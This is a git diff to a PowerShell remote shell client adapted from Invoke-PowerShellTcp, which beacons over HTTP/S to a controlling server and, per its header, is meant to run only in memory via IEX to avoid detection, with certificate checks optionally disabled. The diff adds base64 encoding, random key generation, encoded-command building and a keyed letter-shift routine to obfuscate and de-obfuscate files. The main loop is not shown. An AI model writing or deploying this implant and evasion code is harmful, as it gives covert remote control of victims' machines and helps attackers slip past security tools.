@@ -1,27 +1,21 @@
 <#
-
-async shell client 
+async shell client
 
 Code derived from Invoke-PowerShellTcp, written
 by Nikhil "SamratAshok" Mittal ( GPLv3 ).
 
-It has since been heavliy modified, the direct tcp socket communication
-was scrapped in favor of HTTP/S request communication to the cgi app. 
-This was done to make communication asynchronous which should persist 
-over sporatic internet connections. It goes to sleep when it cannot
-contact the server and makes periodic checks every 5 minutes.
+It has since been heavliy modified, the direct tcp socket communication was scrapped in favor of HTTP/S request 
+communication to the cgi app. This was done to make communication asynchronous which should persist over sporatic 
+internet connections. It goes to sleep when it cannot contact the server and makes periodic checks every 5 minutes.
 
-It works over https and has the ability to ignore cert checking, this 
-was done for compatibility with self-signed certificates (use caution!).
+It works over https and has the ability to ignore cert checking, this was done for compatibility with self-signed 
+certificates (use caution!). The code is self contained without one needing to pass any parameters, just the the 
+web server ip hosting this script in the IEX.
 
-The code is self contained without one needing to pass any parameters,
-just the the web server ip hosting this script in the IEX.
+The changes were made to help make proxing of communication easier. Insure this file is only executed in memory 
+via iex to decrease the likelihood of detection.
 
-The changes were made to help make proxing of communication easier.
-
-Insure this file is only executed in memory via iex to decrease the 
-likelihood of detection.
-						      xor-function
+xor-function
 #>
 
 
@@ -223,6 +217,17 @@ function base64url-encode {
 	return $encurl
 }
 
+# encode a string with base64 to prep for obfuscation do not use this for encoded commands since UTF8
+function base64string-encode {
+
+        param($string)
+
+        # Use this to encode strings to base64 format
+        $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))
+
+        return $encoded
+}
+
 function base64string-decode {
 
         param($encstring)
@@ -233,6 +238,157 @@ function base64string-decode {
         return $decstring
 }
 
+function gen-key {
+        $rs = New-Object System.Random
+        1..40 | % { $key += [Char]$rs.next(97,122) }
+        $kstring = [string]::join("", ($key))
+        return $kstring
+}
+
+function gen-enccmd {
+
+        param($clrcmd)
+
+        $bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString())
+        $enccmd = [Convert]::ToBase64String($bytescmd)
+
+        retrun $enccmd
+}
+
+# action = hide or clear
+# key = encrpytion or decryption string
+# string = base64 string to either be encrypted or decrypted
+
+function obfuscate-base64($action, $key, $string) {
+
+        $alpha = @{ "1" = "A";
+                    "2" = "B";
+                    "3" = "C";
+                    "4" = "D";
+                    "5" = "E";
+                    "6" = "F";
+                    "7" = "G";
+                    "8" = "H";
+                    "9" = "I";
+                    "10" = "J";
+                    "11" = "K";
+                    "12" = "L";
+                    "13" = "M";
+                    "14" = "N";
+                    "15" = "O";
+                    "16" = "P";
+                    "17" = "Q";
+                    "18" = "R";
+                    "19" = "S";
+                    "20" = "T";
+                    "21" = "U";
+                    "22" = "V";
+                    "23" = "W";
+                    "24" = "X";
+                    "25" = "Y";
+                    "26" = "Z";
+        }
+
+        $inv_alpha = @{}
+
+        # create another hash table like alpha but with inverted values
+        foreach ($l in $alpha.Keys ) { $inv_alpha.add($alpha[$l],$l)}
+
+        $count = 0
+        foreach ($ch in $string.GetEnumerator())
+        {
+
+                $c = [string]$ch
+                if ( $c -match '[a-zA-Z]')
+                {
+
+                        $ival = $inv_alpha[$c]
+                        $s = $key[$count]
+
+                        if (!$s) { $count = 0; $s = $key[0] }  # reset key to begining
+
+                        # juggling variable formats between integer and string methods
+                        $ss = [string]$s
+                        $S = $ss.ToUpper()
+                        $shift = $inv_alpha[$S]
+
+                        if ($action -match 'hide' )
+                             { $val = [int]$ival + [int]$shift }
+                        else { $val = [int]$ival - [int]$shift }
+
+                        if ( [int]$val -lt '1'  ) { $val = [int]$val + '26' }
+                        if ( [int]$val -gt '26' ) { $val = [int]$val - '26' }
+
+                        # juggling variable formats between integer and string methods
+                        $sval = [string]$val
+                        $char = $alpha[$sval]
+                        $schar = [string]$char
+
+                        if ( $c -cmatch '[a-z]' )
+                           { $cipher = $schar.ToUpper(); $ncipher += [string]::join("", ($cipher)) }
+                        elseif ( $c -cmatch '[A-Z]' )
+                           { $cipher = $schar.ToLower(); $ncipher += [string]::join("", ($cipher)) }
+                        $count++
+                } else { $ncipher += [string]::join("", ($c)) }
+        }
+        
+        $scipher = [string]$ncipher
+        return $scipher
+}
+
+# requires file name and file path if not in the same running directory
+function obfuscate {
+
+        param($filePath)
+
+        $test = Test-Path $filePath -IsValid
+
+        If ($test -eq $True)
+        {
+
+                $fileString = get-content $filePath | Out-string
+
+                $base64String = base64string-encode $fileString
+
+                $key = gen-key
+
+                $obfuscated = obfuscate-base64 hide $key $base64String
+                $obfuscated > 'New-File.txt'
+
+                $report = "[!] Key generated is : $key `n"
+                $report += "[!] wrote obfuscated data to New-File.txt!"
+
+                write-output $report
+
+         } else { $report = "[!] File path is not valid!"; write-output $report }
+
+
+}
+
+function de-obfuscate ( $filePath, $key ) {
+
+        if ($key)
+        {
+
+                $test = Test-Path $filePath -IsValid
+                if ($test -eq $True)
+                {
+
+                        $obfileString = get-content $filePath | Out-string
+
+                        $clearbase64 = obfuscate-base64 clear $key $obfileString
+                        $clearString = base64string-decode $clearbase64
+                        $clearString > 'File.txt'
+
+                        $report = "[!] wrote de-obfuscated data to File.txt!"
+
+                        write-output $report
+
+                } else { $report = "[!] File path is not valid!"; write-output $report }
+
+        } else { $report = "[!] You need to provide a de-obfuscation key!"; write-output $report }
+
+}
 
 function proc-loop { 
 
